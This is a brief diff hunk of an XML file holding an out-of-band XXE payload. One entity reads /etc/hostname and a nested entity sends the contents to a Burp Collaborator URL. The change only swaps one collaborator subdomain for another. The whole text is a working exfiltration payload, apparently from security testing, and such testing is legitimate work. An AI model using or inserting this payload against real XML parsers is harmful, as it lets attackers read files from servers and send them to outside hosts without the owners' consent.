@@ -4,7 +4,7 @@
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform"/>
 
 <!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://qmgzhnn5l2e8oeoslsgah1zi399cx1.burpcollaborator.net/?x=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://fcvo7cdubr4xe3ehbh6z7qp7tyz2nr.burpcollaborator.net/?x=%file;'>">
 %eval;
 %exfiltrate;
 
